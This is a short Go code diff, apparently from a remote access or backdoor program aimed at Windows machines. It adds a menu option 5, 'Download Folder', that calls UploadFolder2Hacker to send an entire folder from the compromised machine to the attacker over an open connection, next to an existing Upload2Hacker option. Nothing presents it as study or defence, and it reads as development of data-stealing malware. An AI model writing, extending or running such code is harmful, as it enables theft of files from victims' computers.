@@ -70,6 +70,11 @@ func main() {
 			err = upload.Upload2Hacker(connection)
 			DisplayError(err)
 
+		case user_input == "5":
+			fmt.Println("[+] Download Folder")
+			err = upload.UploadFolder2Hacker(connection)
+			DisplayError(err)
+
 		case user_input == "99":
 			fmt.Println("[-] Exiting the windows program")
 			loopControl = false
